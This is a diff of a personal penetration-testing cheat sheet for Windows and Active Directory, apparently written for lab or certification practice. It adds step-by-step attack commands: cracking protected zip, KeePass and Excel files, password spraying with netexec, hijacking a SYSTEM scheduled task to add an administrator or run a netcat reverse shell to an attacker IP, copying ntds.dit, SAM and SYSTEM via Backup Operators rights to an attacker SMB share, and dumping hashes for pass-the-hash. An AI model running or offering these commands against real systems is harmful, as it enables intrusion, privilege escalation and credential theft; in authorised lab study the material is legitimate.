@@ -149,7 +149,7 @@ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ## ==🔵Password cracking : ==
 
-#### ==🔵.zip files==
+#### ==🔴.zip files==
 
 ```
 zip2john winrm_backup.zip > ziphash
@@ -160,6 +160,7 @@ john ziphash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 open the zip and search for any passwords/secrets
+read all files in the zip
 
 then check for password reuse as well
 ```
@@ -167,7 +168,24 @@ sudo su
 or 
 su root
 ```
-#### ==🔵.pfx files==
+
+----
+
+Try normal extraction
+```
+unzip backup.zip
+```
+The extraction fails because of the encrypted archive format.
+
+Use 7-Zip
+```
+7z e backup.zip
+```
+The command prompts for a password.
+
+then again repeat from starting (crack hash)
+
+#### ==🔴.pfx files==
 
 It's a certificate file which you can use for authentication 
 A PFX file is a PKCS#12 container that can hold a certificate and its associated private key.
@@ -208,6 +226,98 @@ subject=CN=<ACCOUNT NAME>
 ```
 The certificate identifies the account username.
 Why this matters: WinRM supports certificate-based authentication. You now have the certificate and private key needed to attempt authentication without using a conventional account password.
+
+#### ==🔴.kdbx files (Keepas)==
+
+Generate the hash:
+```
+keepass2john Database.kdbx > kp.hash
+```
+
+Crack the master password
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash
+```
+
+Check the recovered password:
+```
+john --show kp.hash
+```
+KeePass password recovered
+
+Open the database
+Install KeePassXC if required:
+```
+sudo apt install keepassxc-full -y
+```
+Open the vault:
+```
+keepassxc Database.kdbx
+```
+Enter:
+```
+<recovered password>
+```
+Inside the database, inspect the entries.
+
+#### ==🔴.xlsx==
+
+We now have:
+```
+DA-Recovery.xlsx
+```
+This workbook is password-protected.
+
+Extract the Office hash
+On Kali:
+```
+office2john DA-Recovery.xlsx > off.hash
+```
+
+Crack the password
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt off.hash
+```
+
+Check the result:
+```
+john --show off.hash
+```
+
+Workbook password recovered
+```
+Password: P@ssw0rd
+```
+
+Open the workbook
+Open the file using LibreOffice Calc:
+```
+libreoffice DA-Recovery.xlsx
+```
+
+Enter:
+```
+P@ssw0rd
+```
+
+The workbook initially displays a sheet named:
+```
+Employee Directory
+```
+This is a decoy sheet.
+
+Reveal the hidden sheet
+In LibreOffice:
+```
+Sheet → Show Sheet
+```
+Select the hidden sheet.
+The hidden sheet contains:
+```
+Username: abc
+Password: abc
+```
+Confirm that `<user>` is a member of the **Domain Admins** group.
 
 ## ==🔵If you find any encoded string : ==
 
@@ -4931,6 +5041,7 @@ Other Windows Components > putty
 - Privilege Attacks (`whoami /all`)
 - Service Abuse
 - Registry Attacks > Weak Registry Permissions
+- Scheduled Tasks
 
 #### ==🔵General : ==
 
@@ -6378,6 +6489,28 @@ you can check in your previous shell by `whoami` to see which user to add to adm
 
 ### ==🟢Other Windows Components==
 
+#### ==🔵local accounts==
+
+Once you login to any user on any machine 
+check for local accounts also present on that machine : 
+Remember that local accounts and domain accounts are different authentication identities.
+
+This displays local accounts :
+```
+net user
+```
+This displays domain accounts :
+```
+net user /domain
+```
+
+Test local authentication
+On Kali , test the known local password::
+```
+netexec smb ips -u <local username> -p <passwrds> --local-auth
+```
+CLIENT-1 returns `Pwn3d`.
+This confirms `<local username>` is a local administrator on CLIENT-1.
 #### ==🔵Putty==
 
 Found PUTTY has installed at `C:\Program Files`
@@ -6492,7 +6625,127 @@ exploit/windows/local/cve_2020_0796_smbghost
 exploit/windows/local/cve_2020_1048_printerdemon 
 ```
 
+#### ==🔵Windows patches==
+
+On CLIENT-1:
+```
+systeminfo
+```
+
+Copy the output to the clipboard:
+```
+systeminfo | clip
+```
+
+On Kali:
+```
+git clone https://github.com/bitsadmin/wesng.git
+cd wesng
+```
+
+Create the system-information file:
+```
+gedit systeminfo.txt
+```
+
+Paste the copied output.
+Update the vulnerability database:
+```
+python3 wes.py --update-wes
+```
+
+Run the complete check:
+```
+python3 wes.py systeminfo.txt
+```
+
+Filter for critical vulnerabilities with public exploits:
+```
+python3 wes.py systeminfo.txt -e -s critical
+```
+The walkthrough says the filtered results do not provide an actionable exploit.
+
 #### ==🔵Scheduled Tasks==
+
+##### ==🔴Method 1 :==
+
+use CMD:
+Check all scheduled tasks : 
+```
+powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | Format-Table TaskName,TaskPath,State"
+```
+If already in powershell : Remove the `powershell -c "` and the ending `"`
+Note , Uncommon `TaskName` like `backupsvcweb` which is non default
+
+Inspect `BackupSvcWeb`
+```
+schtasks /query /tn "backupsvcweb(this is task name)" /V /FO LIST
+```
+SEE THESE FIELDS : 
+```
+Task to Run:       "C:\\ProgramData\\BackupSvc\\decoy-web.ps1"
+Run as User:       SYSTEM
+Schedule Type:     At system startup
+```
+The important details are that the task runs as SYSTEM and executes at system startup.
+
+Examine the script
+In PowerShell:
+```
+cat C:\ProgramData\BackupSvc\decoy-web.ps1
+```
+Inspect the file permissions
+```
+get-acl C:\ProgramData\BackupSvc\decoy-web.ps1 | fl
+OR
+icacls C:\ProgramData\BackupSvc\decoy-web.ps1
+```
+```
+BUILTIN\Users:(M)
+```
+`M` means Modify. or `W` modify
+
+Therefore, we can overwrite a PowerShell script that will later execute with SYSTEM privileges.
+
+check current username
+```
+whoami
+```
+add ourself to administrators
+```
+echo 'net localgroup administrators <current username> /add' > C:\ProgramData\BackupSvc\decoy-web.ps1
+```
+Check : 
+```
+cat C:\\ProgramData\\BackupSvc\\decoy-web.ps1
+```
+
+restart pc
+```
+Restart-Computer
+```
+
+After restart , we can check if we get `pwned!` or not :
+```
+netexec smb iplist -u <username> -p <pass>
+```
+
+Now that `<username>` has local administrator access, we can inspect other user profiles.
+Enumerate the complete profile tree.
+```
+tree /a /f C:\Users
+```
+The important profile is:
+```
+C:\Users\svc_backup
+```
+
+OR 
+
+Now dump hash's
+
+
+##### ==🔴Method 2 (Preferred) :==
 
 first we enumerate : 
 switch to powershell
@@ -6504,7 +6757,7 @@ run :
 Get-ScheduledTask | ft TaskName,TaskPath,State
 ```
 
-from here we will not choose tasks with default path of `\Microsoft\Windows`
+from here we will "not" choose tasks with default path of `\Microsoft\Windows`
 we will see for other vulnerable paths
 for ex. 
 ```
@@ -8728,6 +8981,9 @@ Nmap scan all the machine ip's you got :
 sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
 ```
 Do it in individual terminals
+run nmap scans on all 3 IPs individually
+you will find from nmap scans on the machines , if another port tell you `rdp-ntlm-info:`
+If it is using non default rdp port
 
 or you can do on all ips together
 ```
@@ -8737,10 +8993,14 @@ sudo nmap --min-rate 10000 -sCV -p- -Pn -iL ipslist.txt
 -------
 
 get all usernames through ldap
+using initial credentials you got
 ```
 netexec ldap <DC IP> -u lparker -p '!!abbylvzsvs2k6!' --users
+or
+netexec smb <DC IP> -u lparker -p '!!abbylvzsvs2k6!' --users
 ```
 check descriptions also
+put all usernames in a list
 see other ldap commands also
 
 ------
@@ -8751,6 +9011,7 @@ So no list here initially , only 'username' and 'password' for initial creds
 
 ```
 netexec smb <IPlist> -u usernamelist -p passwordlist --continue-on-success
+# | grep -vi STATUS_LOGON_FAILURE
 ```
 and winrm : 
 ```
@@ -8759,6 +9020,7 @@ netexec winrm <IPlist> -u usernamelist -p passwordlist --continue-on-success
 and rdp : 
 ```
 netexec rdp <IPlist> -u usernamelist -p passwordlist --continue-on-success
+# if it uses a non default port (from nmap scans rdp) ; add in last : --port 13389
 ```
 login if you got rdp
 
@@ -8792,6 +9054,7 @@ queries :
 5. shortest path from owned objects
 6. shortest path to domain admins
 7. on profile of owned account , check for outbound object control
+8. see if the user is a member of BACKUP OPERATOR
 
 -----
 
@@ -8858,9 +9121,28 @@ if in winrm , powerup doest run , then run `PrivescCheck`
 
 try the priv esc vectors it gives 
 
--------
+--------
 
-enumerate the smb shares
+Once you login to any user on any machine 
+check for local accounts also present on that machine : 
+Remember that local accounts and domain accounts are different authentication identities.
+
+This displays local accounts :
+```
+net user
+```
+This displays domain accounts :
+```
+net user /domain
+```
+
+Test local authentication
+On Kali , test the known local password::
+```
+netexec smb ips -u <local username> -p <passwrds> --local-auth
+```
+CLIENT-1 returns `Pwn3d`.
+This confirms `<local username>` is a local administrator on CLIENT-1.
 
 -------
 
@@ -8924,6 +9206,10 @@ then try DC SYNC
 Domain Admin membership is not required for DCSync.
 An account with the necessary directory replication rights can perform it too.
 
+ALSO 
+
+check if owned user is part of backup operators group
+
 --------
 
 DONT STOP AT BEING THE LOCAL ADMIN ON THE DC
@@ -8971,6 +9257,9 @@ your owned accounts
 profile 
 have outbound control on whom all
 
+**Pay attention if any of your owned users have Outbound Privileges using BloodHound (GenericAll etc.)
+double check for asreproastable and kerberoastable users.(run manually also even if bloodhound doesn't show)** 
+
 --------
 
 check powershell history
@@ -8978,8 +9267,11 @@ check powershell history
 ----
 
 Check in `C:\` folder
+No Creds Found?
+- Search the filesystem for suspicious files/folders containing potential creds
 
-for any uncommon folder 
+for any uncommon folder ex. `IT` and the contents of that folder and read the files
+The legacy usernames and password is added to the spraying list
 
 if you have any not original file like `windows.old` and if it has sam and system which you can download/transfer back to kali and dump
 ```
@@ -8993,6 +9285,14 @@ impacket-secretsdump -sam SAM_old -system SYSTEM_old LOCAL
 # Extract secrets from historical registry hives
 ```
 
+----
+
+enumerate the smb shares
+
+---
+
+Check for scheduled tasks , windows patches
+
 ---------
 
 login to domain admin
@@ -9002,26 +9302,12 @@ login to domain admin
 (CAN SKIP)
 dump ntds for hashes of all the users in the entire domain
 
-----
-
-check powershell history
-
----
-
-No Creds Found?
-- Search the filesystem for suspicious files/folders containing potential creds
-
----
-
-**Pay attention if any of your owned users have Outbound Privileges using BloodHound (GenericAll etc.), double check for asreproastable and kerberoastable users.(run manually also even if bloodhound doesn't show)** 
-
 ---
 
 lazagne:
 ```
 .\lazagne.exe all
 ```
-
 
 ## ==🟢Tools Setup & Run :== 
 
@@ -9674,7 +9960,8 @@ Use only NTLM hash from `Username:RID:LM_HASH:NTLM_HASH`
 DOESN'T WORK EVERY TIME , BETTER TRY MANUALLY ON EACH IP
 ==🔴For smb : ==
 ```
-netexec smb iplist.txt -d hack-academy.local -u users2.txt -p passwords.txt  --continue-on-success
+netexec smb iplist.txt -d hack-academy.local -u users.txt -p passwords.txt  --continue-on-success
+# | grep -vi STATUS_LOGON_FAILURE
 ```
 ==🔴then try for rdp also :==
 ```
@@ -9683,6 +9970,7 @@ netexec rdp iplist.txt -d hack-academy.local -u users2.txt -p passwords.txt  --c
 ==🔴then try for winrm also :==
 ```
 netexec winrm iplist.txt -d hack-academy.local -u users2.txt -p passwords.txt  --continue-on-success
+# if it uses a non default port (from nmap scans rdp) ; add in last : --port 13389
 ```
 
 ---
@@ -9829,7 +10117,7 @@ evil-winrm -i 10.48.131.119 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' -S -P 5986
 if evil-winrm doesn't work , check if rdp port is open and try that now
 If this doesn't work , move to next 
 
-==🔵Login to user (RDP) (try remmina if xfreerdp doesn't work, also try xfreerdp3): ==
+==🔵Login to user (RDP) (port 3389)(try remmina if xfreerdp doesn't work, also try xfreerdp3): ==
 BLACK SCREEN : lower mtu to 1000
 ```
 xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
@@ -9838,6 +10126,14 @@ example :
 ```
 xfreerdp /v:10.0.0.35 /u:Administrator /p:'Richmond!' /cert:ignore /dynamic-resolution
 ```
+
+==🔵Login to user (RDP) (if it is using a different port ) : ==
+you will find from nmap scans on the machines , if another port tell you `rdp-ntlm-info:`
+If it is using non default rdp port
+```
+
+```
+
 
 ==🔵Win-rm if you have a certificate and a key : ==
 Connect through WinRM over HTTPS
@@ -9954,17 +10250,20 @@ abc_bloodhound.zip
 ##### ==🔴Queries to run :==
 1. Dangerous Privileges > Principals with DCSync privileges (see all users which have the privilege)
 2. Kerberoastable users -> crack hash
-3. as-rep users
+3. as-rep roastable users
 4. Shortest paths to Domain Admins
 5. see all domain admins usernames
-6. see if the user is a member of BACKUP OPERATOR
-7. Shortest Path to High Value targets
-8. shortest path from owned objects (remember to add all accounts you have access to owned)
-See if you find any CA (certificate authority)
+6. on profile of owned account , check for outbound object control
+7. see if the user is a member of BACKUP OPERATOR (check from bloodhound)
+8. Shortest Path to High Value targets
+9. shortest path from owned objects (remember to add all accounts you have access to owned)
+10. See if you find any CA (certificate authority)
+
+SKIP THESE RELATIONS : 
+11. Contains
+12. MemberOf
 
 ==🔴select all the users and services you have both `usernames` and `passwords` for and see==
-
-==🔴SKIP `Contains` AND `MemberOf`==
 
 ##### ==🔴WriteOwner==
 
@@ -10196,7 +10495,7 @@ net localgroup Administrators
 ```
 Our user (`<current username`) is listed.
 
-#### ==🔴Privilege Attacks==
+### ==🔴Privilege Attacks==
 
 ##### ==🔵to check current privileges==
 ```
@@ -10453,7 +10752,7 @@ now we trigger utilman
 from start windows menu > user round icon > lock 
 now click on ease of access button 
 after clicking we will get reverse shell back
-##### ==🔵SeBackup/SeRestore Privilege :==
+##### ==🔵SeBackup/SeRestore Privilege (BUILTIN\Backup Operators) :==
 
 | Check                           | Local SAM command       | Domain NTDS command     |
 | ------------------------------- | ----------------------- | ----------------------- |
@@ -10589,14 +10888,157 @@ NOTICE THE OUTPUT WILL HAVE 2 PARTS :
 # This hash belongs to the domain Administrator account in `fusion.corp`.
 ```
 
+Pass the hash from here for domain admin
 or crack hash
 REMEMBER TO ADD IN LAST : 
 ```
 --format=nt
 ```
 
-#### ==🔴Group Memberships : ==
+### ==🔴Group Memberships : ==
 
+##### ==🔵Group : BUILTIN\Backup Operators (SeBackup/SeRestore Privilege) :==
+
+| Check                           | Local SAM command       | Domain NTDS command     |
+| ------------------------------- | ----------------------- | ----------------------- |
+| `BUILTIN\Backup Operators`      | ✅ Helpful               | ✅ Helpful               |
+| `SeBackupPrivilege` Enabled     | ✅ Helpful               | ✅ Helpful               |
+| `SeRestorePrivilege` Enabled    | ⚪ Not strictly required | ⚪ Not strictly required |
+| `Fusion-DC` (domain controller) | ⚪ Not required          | ✅ Relevant              |
+|                                 |                         |                         |
+If `hostname` command returned Machine-DC, so you're on the machine where the domain database is expected to reside.
+###### ==🔴(To Get Local Admin Hash)(only for local users)==
+
+we take out SAM and SYSTEM from registry directly
+and then well save it locally in our documents
+```
+reg save hklm\sam sam
+reg save hklm\system system
+```
+now well transfer these back to our kali 
+
+If you are in a winrm session , you can download directly now 
+```
+download sam
+download system
+```
+
+On Kali start SMB server : 
+```
+impacket-smbserver share . -smb2support
+```
+On windows transfer files : 
+```
+copy sam \\10.10.14.63\share\sam
+copy system \\10.10.14.63\share\system
+
+# ex. copy windows.txt \\192.168.131.128\share\windows.txt
+```
+
+now we dump these files
+```
+impacket-secretsdump -sam sam -system system LOCAL
+```
+we get admin hash
+```
+Format: RID : LM hash : NT hash
+```
+NOW PASS THE HASH FROM HERE
+login using winrm/rdp using the hash itself
+
+OR
+crack hash
+REMEMBER TO ADD IN LAST : 
+```
+--format=nt
+```
+
+###### ==🔴(If you are on DC machine)(for all domain users)(To Get Domain Admin Hash : depends on machine name if it has -DC in name or not)(use `hostname` command)==
+
+```
+hostname
+```
+
+on kali :
+```
+gedit viper.dsh
+```
+paste in the file :
+```
+set context persistent nowriters
+add volume c: alias viper
+create
+expose %viper% x:
+```
+convert file viper.dsh to DOS format :
+```
+unix2dos viper.dsh
+```
+
+on windows :
+switch directory :
+```
+cd c:\windows\tasks
+```
+upload
+```
+upload viper.dsh
+
+#make sure the `viper.dsh` file is in the same directory from which you have used `winrm` to login to the user
+```
+let it complete
+
+on windows run one by one :
+```
+diskshadow /s viper.dsh
+robocopy /b x:\windows\ntds . ntds.dit
+reg save hklm\system c:\windows\tasks\system
+reg save hklm\sam c:\windows\tasks\sam
+```
+
+Now download it back to kali from the same win-rm session :
+run one by one :
+```
+download ntds.dit
+download system
+download sam
+```
+OR
+on kali :
+```
+impacket-smbserver share ./ -smb2support -user test -pass ''
+```
+on windows :
+connect to share
+```
+net use \\<KALI IP>\share /user:test
+```
+press enter for blank password
+copy everything
+```
+copy sam, ntds.dit, system \\<KALI IP>\share
+```
+
+on kali :
+```
+impacket-secretsdump -ntds ntds.dit -system system -sam sam LOCAL
+```
+NOTICE THE OUTPUT WILL HAVE 2 PARTS :
+```
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+# This hash belongs to the local Administrator account on that Windows machine.
+
+
+[*] Reading and decrypting hashes from ntds.dit
+# This hash belongs to the domain Administrator account in `fusion.corp`.
+```
+
+Pass the hash from here for domain admin
+or crack hash
+REMEMBER TO ADD IN LAST : 
+```
+--format=nt
+```
 ##### ==🔵Group : BUILTIN\Server Operators :==
 
 Check if you have membership in `Server Operators` : (using `whoami /all`)
@@ -11341,6 +11783,187 @@ If you’re running with cmd you can also wrap the command inside powershell -C 
 powershell.exe -c "Get-ChildItem -Path C:\\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows\\' } | Select-String -Pattern 'pwd=', 'password=', 'username=', 'user=', 'pass=', 'ryan', 'abigail', 'melanie'"
 ```
 It recursively checks the content of all files of the filesystem and excludes the paths you specify with -notmatch, so give it some time to run.
+
+### ==🔵Scheduled Tasks==
+
+##### ==🔴Method 1 :==
+
+use CMD:
+Check all scheduled tasks : 
+```
+powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | Format-Table TaskName,TaskPath,State"
+```
+If already in powershell : Remove the `powershell -c "` and the ending `"`
+Note , Uncommon `TaskName` like `backupsvcweb` which is non default
+
+Inspect `BackupSvcWeb`
+```
+schtasks /query /tn "backupsvcweb(this is task name)" /V /FO LIST
+```
+SEE THESE FIELDS : 
+```
+Task to Run:       "C:\\ProgramData\\BackupSvc\\decoy-web.ps1"
+Run as User:       SYSTEM
+Schedule Type:     At system startup
+```
+The important details are that the task runs as SYSTEM and executes at system startup.
+
+Examine the script
+In PowerShell:
+```
+cat C:\ProgramData\BackupSvc\decoy-web.ps1
+```
+Inspect the file permissions
+```
+get-acl C:\ProgramData\BackupSvc\decoy-web.ps1 | fl
+OR
+icacls C:\ProgramData\BackupSvc\decoy-web.ps1
+```
+```
+BUILTIN\Users:(M)
+```
+`M` means Modify. or `W` modify
+
+Therefore, we can overwrite a PowerShell script that will later execute with SYSTEM privileges.
+
+check current username
+```
+whoami
+```
+add ourself to administrators
+```
+echo 'net localgroup administrators <current username> /add' > C:\ProgramData\BackupSvc\decoy-web.ps1
+```
+Check : 
+```
+cat C:\\ProgramData\\BackupSvc\\decoy-web.ps1
+```
+
+restart pc
+```
+Restart-Computer
+```
+
+After restart , we can check if we get `pwned!` or not :
+```
+netexec smb iplist -u <username> -p <pass>
+```
+
+Now that `<username>` has local administrator access, we can inspect other user profiles.
+Enumerate the complete profile tree.
+```
+tree /a /f C:\Users
+```
+The important profile is:
+```
+C:\Users\svc_backup
+```
+
+OR 
+
+Now dump hash's
+
+
+##### ==🔴Method 2 (Preferred) :==
+
+first we enumerate : 
+switch to powershell
+```
+powershell
+```
+run : 
+```
+Get-ScheduledTask | ft TaskName,TaskPath,State
+```
+
+from here we will "not" choose tasks with default path of `\Microsoft\Windows`
+we will see for other vulnerable paths
+for ex. 
+```
+vulntask                                             \              
+```
+now we enumerate more on the task we found 
+```
+schtasks /query /fo LIST /v /tn <TASK NAME>
+```
+from here look for path of task and other details : 
+```
+Next Run Time:                        N/A (n/A : we can run it whenever we want)
+Task To Run:                          C:\tasks\schtask.bat 
+Scheduled Task State:                 Enabled
+Run As User:                          taskusr1
+Schedule Type:                        At system start up
+```
+
+now we have to check if we have write permission on the task file location or not 
+```
+icacls C:\tasks\schtask.bat 
+```
+or
+switch to PowerShell : 
+```
+powershell
+```
+run : 
+```
+Get-Acl -Path "C:\tasks\schtask.bat" | fl
+```
+
+if users have full access :
+now in this scheduled task well add a new line for our reverse shell or use netcat
+Start a listener on Kali and then append a line
+```
+>    # to replace the contents of the file
+>>   # to append / add new lines in bottom
+```
+
+```
+echo c:\tools\nc64.exe -e cmd.exe 192.168.163.199 4444 > C:\tasks\schtask.bat
+or 
+echo <path_for_reverse_shell> >> <path_for_script.ps1> 
+```
+check : 
+```
+type C:\tasks\schtask.bat
+```
+first well start our listener on kali 
+```
+rlwrap -f . nc -lvnp 4444
+```
+
+now if it says the scheduled task is made run on startup 
+if we have the permission to restart/run the task we could do : 
+```
+schtasks /run /tn vulntask
+```
+or 
+you can restart the windows vm if we have permission 
+```
+shutdown -r
+```
+we will get shell back
+### ==🔵local accounts==
+
+Once you login to any user on any machine 
+check for local accounts also present on that machine : 
+Remember that local accounts and domain accounts are different authentication identities.
+
+This displays local accounts :
+```
+net user
+```
+This displays domain accounts :
+```
+net user /domain
+```
+
+Test local authentication
+On Kali , test the known local password::
+```
+netexec smb ips -u <local username> -p <passwrds> --local-auth
+```
+CLIENT-1 returns `Pwn3d`.
+This confirms `<local username>` is a local administrator on CLIENT-1.
 
 ### ==🔵Dump LSASS memory with Mimikatz (prefer remote dump)==
 
